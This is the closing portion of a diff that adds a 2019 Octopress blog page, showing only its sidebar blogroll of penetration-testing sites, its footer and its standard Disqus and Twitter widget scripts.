+  </ul>
+  
+    <a href="http://twitter.com/chous3nsha" class="twitter-follow-button" data-show-count="true">Follow @chous3nsha</a>
+  
+</section>
+
+<section>
+  <h1>Blogroll</h1>
+  <p><a href="https://blog.g0tmi1k.com/">g0tmi1k</a></p>
+  <p><a href="http://redteamjournal.com/">Red Team Journal</a></p>
+  <p><a href="https://www.corelan.be/">Corelan Team</a></p>
+  <p><a href="http://www.madirish.net/">Mad Irish</a></p>
+  <p><a href="http://redteams.net/blog/">redteams.net</a></p>
+  <p><a href="https://www.mattandreko.com/">MattAndreko.com</a></p>
+  <p><a href="http://blog.portswigger.net/">Portswigger Web Security</a></p>
+  <p><a href="http://blog.cobaltstrike.com/">Cobalt Strike blog</a></p>
+  <p><a href="https://highon.coffee/blog/">HighOn.Coffee</a></p>
+  <p><a href="https://pentestlab.blog/">Penetration Testing Lab</a></p
+</section>
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2019 - chousensha -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'coredumpoverflow';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://chousensha.github.io/blog/2019/04/15/donkey-docker/';
+        var disqus_url = 'http://chousensha.github.io/blog/2019/04/15/donkey-docker/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
